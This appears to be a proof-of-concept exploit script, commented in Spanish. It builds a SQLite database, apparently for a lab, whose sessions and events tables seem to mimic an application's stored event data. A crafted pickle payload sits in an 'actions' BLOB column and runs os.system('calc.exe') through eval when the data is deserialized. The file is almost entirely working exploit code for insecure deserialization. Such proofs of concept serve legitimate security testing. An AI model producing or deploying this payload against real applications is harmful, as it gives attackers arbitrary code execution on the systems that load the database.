import sqlite3
import os
# CONFIGURACIÓN DE RUTA ÚNICA
DB_PATH = '/home/kw0/lab_attack/malicious.db'
# Asegurar que el directorio existe
os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
# Borrar DB previa para asegurar limpieza total
if os.path.exists(DB_PATH):
    os.remove(DB_PATH)
# Payload binario verificado para Windows
payload = b"\x80\x04\x95?\x00\x00\x00\x00\x00\x00\x00\x8c\x08builtins\x94\x8c\x04eval\x94\x93\x94\x8c#__import__('os').system('calc.exe')\x94\x85\x94R\x94."
# CONECTAR USANDO LA RUTA DEFINIDA
conn = sqlite3.connect(DB_PATH)
cur = conn.cursor()
# Esquema v0 COMPLETO
cur.execute("CREATE TABLE sessions (app_name TEXT, user_id TEXT, id TEXT, state TEXT DEFAULT '{}', create_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP, update_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (app_name, user_id, id))")
cur.execute("CREATE TABLE events (id TEXT PRIMARY KEY, actions BLOB, app_name TEXT, user_id TEXT, session_id TEXT, timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")
# Inyectar datos
cur.execute("INSERT INTO sessions (app_name, user_id, id) VALUES (?, ?, ?)", ("default_app", "user_1", "session_1"))
cur.execute("INSERT INTO events (id, actions, app_name, user_id, session_id) VALUES (?, ?, ?, ?, ?)", ("event_666", payload, "default_app", "user_1", "session_1"))
conn.commit()
conn.close()
print(f"[+] Archivo {DB_PATH} generado con éxito.")